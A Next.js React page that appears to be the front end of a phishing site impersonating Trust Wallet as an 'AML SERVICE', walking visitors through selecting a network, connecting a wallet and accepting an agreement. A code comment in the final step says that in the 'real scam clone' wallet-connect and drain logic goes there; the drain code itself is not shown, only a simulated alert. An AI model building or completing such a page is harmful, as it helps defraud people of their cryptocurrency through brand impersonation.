'use client';

import { useState } from 'react';
import { CheckCircle2, Circle } from 'lucide-react';
import Image from 'next/image';
import SelectNetworkStep from '@/components/steps/SelectNetworkStep';     // create these
import ConnectWalletStep from '@/components/steps/ConnectWalletStep';
import AMLAgreementStep from '@/components/steps/AMLAgreementStep';      // we'll move your current content here

export default function TrustWalletPage() {
  const [step, setStep] = useState(0);                  // 0 = Select Network, 1 = Connect, 2 = Agreement/Report
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null);
  const [termsAccepted, setTermsAccepted] = useState(false);

  const totalSteps = 3;
  const stepLabels = ['Select Network', 'Connect Wallet', 'AML Report'];

  const handleNext = () => {
    if (step === 0 && !selectedNetwork) return;       // require network
    if (step === 2 && !termsAccepted) return;         // require agreement
    if (step < totalSteps - 1) {
      setStep(step + 1);
    } else {
      // Final action: simulate "AML check" or connect
      alert('Processing AML Report... (simulation)');
      // In real scam clone: trigger wallet connect / drain logic here
    }
  };

  const isNextDisabled = 
    (step === 0 && !selectedNetwork) ||
    (step === 2 && !termsAccepted);

  return (
    <div className="min-h-screen bg-[#1a1a1a] flex flex-col">
      {/* Fixed Header with Progress */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-[#1a1a1a] border-b border-[#00ff88]/30 py-4 px-4 sm:px-6">
        <div className="max-w-3xl mx-auto text-center">
          <h1 className="text-2xl sm:text-3xl font-bold text-white tracking-tight">
            TRUST<span className="font-light">WALLET</span>
          </h1>
          <p className="text-xs sm:text-sm text-gray-400 mt-1">AML SERVICE</p>

          {/* Stepper */}
          <div className="mt-6 flex justify-center items-center gap-4 sm:gap-8">
            {Array.from({ length: totalSteps }).map((_, i) => (
              <div key={i} className="flex flex-col items-center">
                <div
                  className={`w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold border-2 transition-all ${
                    i < step
                      ? 'bg-[#00ff88] border-[#00ff88] text-black'
                      : i === step
                      ? 'bg-[#00ff88]/70 border-[#00ff88] text-white'
                      : 'bg-gray-700 border-gray-600 text-gray-400'
                  }`}
                >
                  {i + 1}
                </div>
                {i < totalSteps - 1 && (
                  <div
                    className={`h-1 w-12 sm:w-20 mt-2 ${
                      i < step - 1 ? 'bg-[#00ff88]' : 'bg-gray-700'
                    }`}
                  />
                )}
              </div>
            ))}
          </div>

          <div className="mt-3 flex justify-between text-xs text-gray-400 max-w-[280px] sm:max-w-md mx-auto">
            {stepLabels.map((label) => (
              <span key={label}>{label}</span>
            ))}
          </div>
        </div>
      </header>

      {/* Main Content - pad top & bottom for fixed elements */}
      <main className="flex-1 pt-40 pb-32 flex items-start justify-center px-4 sm:px-6">
        <div className="w-full max-w-sm space-y-8 sm:space-y-12">
          {/* Dynamic step content */}
          {step === 0 && (
            <SelectNetworkStep
              selected={selectedNetwork}
              onSelect={setSelectedNetwork}
            />
          )}

          {step === 1 && <ConnectWalletStep />}

          {step === 2 && (
            <AMLAgreementStep
              termsAccepted={termsAccepted}
              setTermsAccepted={setTermsAccepted}
            />
          )}
        </div>
      </main>

      {/* Fixed Bottom Button */}
      <footer className="fixed bottom-0 left-0 right-0 z-50 bg-[#1a1a1a] border-t border-[#00ff88]/30 py-6 px-4 sm:px-6">
        <button
          onClick={handleNext}
          disabled={isNextDisabled}
          className={`w-full font-semibold py-3 sm:py-4 px-6 rounded-full text-base sm:text-lg transition-all cursor-pointer ${
            isNextDisabled
              ? 'bg-gray-700 text-gray-400 cursor-not-allowed'
              : 'bg-[#00ff88] text-black hover:bg-[#00dd77]'
          }`}
        >
          Continue
        </button>
      </footer>
    </div>
  );
}
